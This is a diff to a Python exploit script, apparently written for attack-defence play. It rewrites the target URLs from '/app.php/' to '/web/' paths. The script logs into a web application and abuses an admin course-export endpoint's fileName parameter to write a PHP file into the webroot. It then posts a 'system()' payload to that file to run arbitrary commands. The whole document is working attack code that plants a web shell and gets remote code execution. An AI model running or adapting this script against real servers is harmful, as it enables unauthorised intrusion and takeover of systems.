@@ -32,13 +32,13 @@ def shit(target,target_port,cmd):
     ip = target
     shellhash =  hashlib.md5(str(time.time())).hexdigest()
 
-    url = 'http://%s:%s/app.php/login' % (ip,str(target_port))
-    url_2 = 'http://%s:%s/app.php/login_check' %(ip,str(target_port))
-    url_3 = 'http://%s:%s/app.php/' %(ip,str(target_port))
-    url_4 = 'http://%s:%s/app.php/settings/' % (ip,str(target_port))
-    url_5 = 'http://%s:%s/app.php/logout' % (ip,str(target_port))
-    url_6 = 'http://%s:%s/app.php/admin/order/manage/export/course?loop=s&start=0&fileName=/var/www/html/web/files/%s.php' % (ip,str(target_port),shellhash)
-    url_7 = 'http://%s:%s/app.php/register/submited/1/ae797a91d0493acb27050b05c884a4ae'  % (ip,str(target_port))
+    url = 'http://%s:%s/web/login' % (ip,str(target_port))
+    url_2 = 'http://%s:%s/web/login_check' %(ip,str(target_port))
+    url_3 = 'http://%s:%s/web/' %(ip,str(target_port))
+    url_4 = 'http://%s:%s/web/settings/' % (ip,str(target_port))
+    url_5 = 'http://%s:%s/web/logout' % (ip,str(target_port))
+    url_6 = 'http://%s:%s/web/admin/order/manage/export/course?loop=s&start=0&fileName=/var/www/html/web/files/%s.php' % (ip,str(target_port),shellhash)
+    url_7 = 'http://%s:%s/web/register/submited/1/ae797a91d0493acb27050b05c884a4ae'  % (ip,str(target_port))
 
     '''
     url = 'http://%s:%s/login' % (ip,str(target_port))
@@ -70,7 +70,7 @@ def shit(target,target_port,cmd):
     payload = "system('%s');"%cmd
     data = '2222=%s'% quote(payload)
 
-    res = http("post",target,target_port,"/files/%s.php"%shellhash,data,headers) 
+    res = http("post",target,target_port,"/web/files/%s.php"%shellhash,data,headers) 
     print res
 
     return res
